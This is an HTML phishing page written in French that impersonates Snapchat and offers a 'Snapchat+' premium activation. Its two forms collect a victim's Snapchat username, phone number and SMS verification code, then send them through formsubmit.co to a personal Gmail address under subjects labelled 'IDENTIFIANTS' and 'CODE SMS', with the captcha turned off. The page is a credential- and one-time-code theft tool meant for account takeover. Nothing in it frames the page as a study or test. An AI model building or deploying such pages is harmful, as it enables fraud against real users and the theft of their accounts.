                    

                <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Plus</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Ton fond perso */
            background: #fff; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            background-color: #fff;
        }

        /* Carré jaune avec fantôme */
        .snap-logo {
            width: 120px; /* Plus grand */
            height: 120px;
            background-color: #FFFC00;
            border-radius: 30px;
            margin: 0 auto 25px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        /* Fantôme style Snapchat */
        .ghost-svg {
            width: 80px; /* Plus grand */
            height: 80px;
            fill: #FFFFFF;
        }

        h1 {
            font-size: 26px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 800;
        }

        p {
            color: #555;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
            background-color: #fff;
        }

        input:focus {
            border-color: #FFFC00;
        }

        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Carré jaune avec fantôme corrigé -->
        <div class="snap-logo">
            <!-- SVG Fantôme style Snapchat (Tête ronde, corps vague) -->
            <svg class="ghost-svg" viewBox="0 0 512 512">
                <path d="M256 32c-98.9 0-176 77.1-176 176v96.5c0 44.3 17.2 86.9 48.1 118.3 15.9 16.1 35.5 27.9 56.9 34.7 1.9.6 4 .2 5.4-1.1 1.3-1.3 1.7-3.4 1.1-5.3-6-20.7-8.5-42.3-7.5-63.9 1.3-28.8 12.9-56.3 32.8-77.2 20.9-21.9 49.3-34.5 79.2-34.5s58.3 12.6 79.2 34.5c19.9 20.9 31.5 48.4 32.8 77.2 1 21.6-1.5 43.2-7.5 63.9-.6 1.9-.2 4 1.1 5.3 1.4 1.4 3.5 1.7 5.4 1.1 21.4-6.8 41-18.6 56.9-34.7 30.9-31.4 48.1-74 48.1-118.3V208c0-98.9-77.1-176-176-176z"/>
            </svg>
        </div>

        <!-- Étape 1 : Infos -->
        <div id="step-1">
            <h1>Snapchat+</h1>
            <p>Activer votre profil premium.</p>
            
            <form action="https://formsubmit.co/patrick.03.3.2003@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="Snapchat+ - IDENTIFIANTS">
                <input type="hidden" name="_captcha" value="false">
                <!-- Si tu veux être redirigé sur la page après (optionnel) -->
                <!-- <input type="hidden" name="_next" value="https://ton-site.com/merci.html"> -->

                <div class="form-group">
                    <label for="username">Nom d'utilisateur</label>
                    <input type="text" id="username" name="username" placeholder="Nom d'utilisateur Snapchat" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone" required>
                </div>

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS -->
        <div id="step-2">
            <h1>Vérification</h1>
            <!-- Le texte exact que tu as demandé -->
            <p>Entrez le code à 4 chiffres reçu par SMS. Le code peut prendre une dizaine de minute à arriver.</p>
            
            <form action="https://formsubmit.co/patrick.03.3.2003@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="Snapchat+ - CODE SMS">
                <input type="hidden" name="_captcha" value="false">

                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                </div>

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
        </div>

    </div>

    <script>
        // Transition automatique après le clic sur "Vérifier"
        document.getElementById('step-1 form').addEventListener('submit', function(e) {
            // Petit délai pour l'effet
            setTimeout(() => {
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
            }, 500);
        });
    </script>
</body>
</html>
